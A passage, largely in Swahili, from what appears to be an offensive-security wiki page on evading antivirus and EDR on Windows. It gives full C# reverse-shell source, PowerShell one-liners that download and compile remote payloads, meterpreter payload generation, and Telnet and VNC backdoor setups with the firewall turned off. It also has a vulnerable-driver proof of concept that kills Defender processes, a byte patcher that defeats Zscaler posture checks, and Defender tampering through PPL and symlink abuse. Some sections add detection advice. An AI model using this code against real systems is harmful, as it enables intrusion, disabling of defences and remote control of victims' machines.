- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya chanzo-wazi ya [LLVM](http://www.llvm.org/) compilation suite inayoweza kutoa usalama ulioboreshwa wa programu kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuzalisha, wakati wa compile, code iliyofichwa bila kutumia tool yoyote ya nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Ongeza layer ya operations zilizofichwa zinazozalishwa na C++ template metaprogramming framework ambayo itafanya maisha ya mtu anayetaka crack application kuwa magumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha pe files mbalimbali tofauti ikiwa ni pamoja na: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni simple metamorphic code engine kwa executable yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa lugha zinazoungwa mkono na LLVM kwa kutumia ROP (return-oriented programming). ROPfuscator huficha programu kwenye kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, na hivyo kuzuia wazo letu la asili la normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode kisha kuzipakia

## SmartScreen & MoTW

Huenda umeiona skrini hii unapopakua baadhi ya executables kutoka kwenye internet na kuzitekeleza.

Microsoft Defender SmartScreen ni security mechanism iliyokusudiwa kumlinda user wa mwisho dhidi ya kuendesha potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hasa hufanya kazi kwa njia ya reputation-based approach, maana yake applications zinazopakuliwa mara chache zitaanzisha SmartScreen hivyo kumwonya na kumzuia user wa mwisho asitekeleze faili (ingawa faili bado inaweza kutekelezwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo huundwa kiotomatiki wakati wa kupakua faili kutoka internet, pamoja na URL ilipopakuliwa kutoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kuwa executables zilizosainiwa kwa certificate ya **trusted** ya kusaini **hazitaanzisha SmartScreen**.

Njia yenye ufanisi sana ya kuzuia payloads zako zisipate Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwa volumes zisizo za **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayopakia payloads ndani ya output containers ili kukwepa Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hii hapa ni demo ya kukwepa SmartScreen kwa kufungasha payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni mekanismo yenye nguvu ya logging ndani ya Windows ambayo huruhusu applications na system components **ku-log events**. Hata hivyo, pia inaweza kutumiwa na security products kufuatilia na kugundua shughuli hasidi.

Sawa na jinsi AMSI inavyolemazwa (bypassed), pia inawezekana kufanya function ya **`EtwEventWrite`** ya user space process irudi mara moja bila ku-log events zozote. Hii hufanywa kwa kupatch function hiyo kwenye memory ili irudi mara moja, hivyo kwa vitendo kuzima ETW logging kwa hiyo process.

Unaweza kupata maelezo zaidi kwenye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Kupakia C# binaries kwenye memory kumekuwa kukijulikana kwa muda mrefu na bado ni njia nzuri sana ya kuendesha post-exploitation tools zako bila kukamatwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutahitaji tu kuwa na wasiwasi wa kupatch AMSI kwa process nzima.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) tayari zinatoa uwezo wa kutekeleza C# assemblies moja kwa moja kwenye memory, lakini zipo njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuanzisha process mpya ya kujitolea**, kuingiza malicious code yako ya post-exploitation ndani ya hiyo process mpya, kutekeleza malicious code yako na ikimaliza, kuua process mpya. Hii ina faida na hasara zake. Faida ya mbinu ya fork and run ni kwamba utekelezaji hutokea **nje ya** Beacon implant process yetu. Hii inamaanisha kwamba ikiwa kitu fulani kwenye post-exploitation action yetu kitaenda vibaya au kitagunduliwa, kuna **uwezekano mkubwa zaidi** kwamba **implant yetu itaendelea kuishi.** Hasara ni kwamba una **uwezekano mkubwa zaidi** wa kukamatwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ni kuhusu kuingiza malicious code ya post-exploitation **ndani ya process yake yenyewe**. Kwa njia hii, unaweza kuepuka kuunda process mpya na kuifanya ichunguzwe na AV, lakini hasara ni kwamba ikiwa kitu kitaenda vibaya wakati wa utekelezaji wa payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu inaweza kucrash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa unataka kusoma zaidi kuhusu C# Assembly loading, tafadhali angalia article hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza malicious code kwa kutumia languages nyingine kwa kuipa compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

Kwa kuruhusu access kwa Interpreter Binaries na environment kwenye SMB share unaweza **kutekeleza arbitrary code katika languages hizi ndani ya memory** ya compromised machine.

The repo inaonyesha: Defender bado huchanganua scripts lakini kwa kutumia Go, Java, PHP n.k. tuna **flexibility zaidi ya kukwepa static signatures**. Kupima na random un-obfuscated reverse shell scripts katika languages hizi kumethibitika kufanikiwa.

## TokenStomping

Token stomping ni technique ambayo humruhusu mshambuliaji **kudhibiti access token au security prouct kama EDR au AV**, na kumwezesha kupunguza privileges zake ili process isife lakini pia isiwe na permissions za kuangalia shughuli hasidi.

Ili kuzuia hili Windows inaweza **kuzuia external processes** kupata handles juu ya tokens za security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu ku-deploy Chrome Remote Desktop kwenye PC ya mwathiriwa na kisha kuitumia kuichukua udhibiti na kudumisha persistence:
1. Pakua kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", na kisha bofya faili ya MSI kwa Windows kupakua faili ya MSI.
2. Endesha installer kimya kimya kwenye mwathiriwa (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Wizard basi itaomba uidhinishe; bofya kitufe cha Authorize ili kuendelea.
4. Tekeleza parameter iliyotolewa na marekebisho machache: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Angalia param ya pin ambayo inaruhusu kuweka pin bila kutumia GUI).


## Advanced Evasion

Evasion ni mada yenye ugumu mkubwa, wakati mwingine unapaswa kuzingatia vyanzo vingi tofauti vya telemetry katika mfumo mmoja tu, hivyo ni karibu haiwezekani kubaki bila kugunduliwa kabisa katika environments zilizokomaa.

Kila environment unayoshambulia itakuwa na strengths na weaknesses zake.

Ninapendekeza sana uende uone talk hii kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate msingi wa kuelekea kwenye Advanced Evasion techniques zaidi.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

hii pia ni talk nyingine nzuri sana kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) ambayo **itaondoa parts za binary** mpaka **igundue ni sehemu gani Defender** inayoona kama malicious na kukugawanyia.\
Kifaa kingine kinachofanya **jambo hilohilo ni** [**avred**](https://github.com/dobin/avred) chenye huduma ya wazi ya web kwenye [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, windows zote zilikuja na **Telnet server** ambayo ungeweza kuinstall (kama administrator) kwa kufanya:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ifanya **ianze** wakati mfumo unapoanzishwa na **ikimbie** sasa:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Badilisha port ya telnet** (stealth) na lemaza firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka bin downloads, siyo setup)

**KATIKA HOST**: Tekeleza _**winvnc.exe**_ na sanidi server:

- Washa option _Disable TrayIcon_
- Weka password katika _VNC Password_
- Weka password katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili **mpya** iliyoundwa _**UltraVNC.ini**_ ndani ya **victim**

#### **Reverse connection**

**attacker** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea reverse **VNC connection**. Kisha, ndani ya **victim**: Anzisha winvnc daemon `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Ili kudumisha stealth hupaswi kufanya mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa au uta-trigger [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendeshwa kwa `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` katika directory ileile au itasababisha [the config window](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usirun `winvnc -h` kwa help au uta-trigger [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Ndani ya GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sasa **anza lister** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mlinzi wa sasa atasitisha mchakato haraka sana.**

### Kukompaili reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

Kompaili kwa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Tumia nayo:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# kutumia compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji otomatiki:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa build injectors mfano:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ilitumia shirika dogo la console linalojulikana kama **Antivirus Terminator** ili kuzima ulinzi wa endpoint kabla ya kuangusha ransomware. Zana hiyo inaleta **driver yake yenyewe iliyo vulnerable lakini *signed*** na kuitumia vibaya kutoa operations za kernel zenye haki ya juu ambazo hata huduma za Protected-Process-Light (PPL) AV haziwezi kuzuia.

Key take-aways
1. **Signed driver**: Faili inayowasilishwa kwenye disk ni `ServiceMouse.sys`, lakini binary halisi ni driver iliyosainiwa kihalali `AToolsKrnl64.sys` kutoka Antiy Labs’ “System In-Depth Analysis Toolkit”. Kwa kuwa driver hii ina Microsoft signature halali, inapakiwa hata Driver-Signature-Enforcement (DSE) ikiwa imewashwa.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Mstari wa kwanza unasajili driver kama **kernel service** na wa pili unaiwasha ili `\\.\ServiceMouse` iweze kupatikana kutoka user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Kusitisha process yoyote kwa PID (ilitumika kuua Defender/EDR services) |
| `0x990000D0` | Kufuta faili yoyote kwenye disk |
| `0x990001D0` | Ku-unload driver na kuondoa service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD inaruka user-mode protections kabisa; code inayotekelezwa kwenye kernel inaweza kufungua processes *protected*, kuzisitisha, au kubadilisha kernel objects bila kujali PPL/PP, ELAM au features nyingine za hardening.

Detection / Mitigation
•  Wezesha Microsoft vulnerable-driver block list (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa new *kernel* services na toa alert wakati driver inapakiwa kutoka directory inayoweza kuandikwa na wote au haipo kwenye allow-list.
•  Angalia user-mode handles kuelekea custom device objects zikifuatiwa na suspicious `DeviceIoControl` calls.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** hutumia device-posture rules locally na hutegemea Windows RPC kuwasilisha matokeo kwa components nyingine. Chaguzi mbili dhaifu za muundo zinafanya bypass kamili iwezekane:

1. Tathmini ya posture hufanyika **kabisa upande wa client** (boolean hutumwa kwa server).
2. Internal RPC endpoints huthibitisha tu kwamba executable inayounganishwa imesainiwa na **Zscaler** (kupitia `WinVerifyTrust`).

Kwa **kurekebisha signed binaries nne kwenye disk** mifumo yote miwili inaweza kuzimwa:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila wakati hivyo kila check inakuwa compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ process yoyote (hata unsigned) inaweza ku-bind kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Imebadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Ime-short-circuit |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Baada ya kubadilisha faili za asili na kuanzisha upya service stack:

* **Zote** posture checks zinaonyesha **green/compliant**.
* Binaries zisizosainiwa au zilizobadilishwa zinaweza kufungua named-pipe RPC endpoints (mfano `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathiriwa inapata unrestricted access kwa internal network iliyofafanuliwa na Zscaler policies.

Kesi hii inaonyesha jinsi purely client-side trust decisions na simple signature checks zinavyoweza kushindwa kwa byte patches chache.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) hutekeleza signer/level hierarchy ili kwamba tu equal-or-higher protected processes zisiweze kutamperiana. Kwa upande wa kushambulia, ukiweza legitimately kuanzisha PPL-enabled binary na kudhibiti arguments zake, unaweza kubadilisha benign functionality (mfano, logging) kuwa constrained, PPL-backed write primitive dhidi ya protected directories zinazotumiwa na AV/EDR.

Ni nini hufanya process iendeshe kama PPL
- Target EXE (na DLLs zozote zilizopakiwa) lazima zisiwe signed na PPL-capable EKU.
- Process lazima iundwe kwa CreateProcess ikitumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Kiwango cha protection kinacholingana lazima kiombwe ili kilingane na signer wa binary (mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa anti-malware signers, `PROTECTION_LEVEL_WINDOWS` kwa Windows signers). Viwango visivyo sahihi vitashindwa wakati wa creation.

Tazama pia utangulizi mpana wa PP/PPL na LSASS protection hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (huchagua protection level na kusambaza arguments kwa target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Signed system binary `C:\Windows\System32\ClipUp.exe` hujianzisha yenyewe na hukubali parameter ya kuandika log file kwenye path iliyobainishwa na caller.
- Inapozinduliwa kama PPL process, file write hutokea kwa PPL backing.
- ClipUp haiwezi kuchambua paths zenye spaces; tumia 8.3 short paths kuelekeza kwenye locations ambazo kwa kawaida zinalindwa.

8.3 short path helpers
- Orodhesha short names: `dir /x` katika kila parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Zindua PPL-capable LOLBIN (ClipUp) kwa `CREATE_PROTECTED_PROCESS` kwa kutumia launcher (mfano, CreateProcessAsPPL).
2) Pitia ClipUp log-path argument ili kulazimisha file creation kwenye protected AV directory (mfano, Defender Platform). Tumia 8.3 short names ikihitajika.
3) Ikiwa target binary kawaida huwa open/locked na AV wakati inaendelea kufanya kazi (mfano, MsMpEng.exe), panga write wakati wa boot kabla AV haijaanza kwa kusakinisha auto-start service inayoendeshwa kwa uhakika mapema zaidi. Thibitisha boot ordering kwa Process Monitor (boot logging).
4) Wakati wa reboot PPL-backed write hutokea kabla AV haijafunga binaries zake, ikiharibu target file na kuzuia startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Catatan na vizuizi
- Huwezi kudhibiti maudhui ambayo ClipUp inaandika zaidi ya eneo; primitive hii inafaa kwa corruption badala ya content injection sahihi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na dirisha la reboot.
- Timing ni muhimu: target lazima isiwe open; utekelezaji wakati wa boot huepuka file locks.

Uchunguzi
- Process creation ya `ClipUp.exe` na arguments zisizo za kawaida, hasa ikiwa parent ni non-standard launchers, wakati wa boot.
- New services zilizosetiwa auto-start kwa suspicious binaries na kuanza kwa uthabiti kabla ya Defender/AV. Chunguza service creation/modification kabla ya Defender startup failures.
- File integrity monitoring kwenye Defender binaries/Platform directories; unexpected file creations/modifications na processes zenye protected-process flags.
- ETW/EDR telemetry: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya PPL level na non-AV binaries.

Ulinzi
- WDAC/Code Integrity: zuia ni signed binaries gani zinaweza kuendeshwa kama PPL na chini ya parents gani; block ClipUp invocation nje ya legitimate contexts.
- Service hygiene: zuia creation/modification ya auto-start services na monitor start-order manipulation.
- Hakikisha Defender tamper protection na early-launch protections zimewezeshwa; chunguza startup errors zinazoonyesha binary corruption.
- Fikiria kuzima 8.3 short-name generation kwenye volumes zinazo-host security tooling kama inalingana na mazingira yako (jaribu kwa kina).

Marejeo ya PPL na tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender huchagua platform itakayokimbia nayo kwa kuorodhesha subfolders chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua subfolder yenye highest lexicographic version string (mfano, `4.18.25070.5-0`), kisha huanzisha Defender service processes kutoka hapo (ikisasisha service/registry paths ipasavyo). Uchaguzi huu unaamini directory entries ikiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye attacker-writable path na kupata DLL sideloading au service disruption.

Masharti ya awali
- Local Administrator (inahitajika kuunda directories/symlinks chini ya Platform folder)
- Uwezo wa reboot au trigger Defender platform re-selection (service restart on boot)
- Ni built-in tools pekee zinazohitajika (mklink)

Kwa nini inafanya kazi
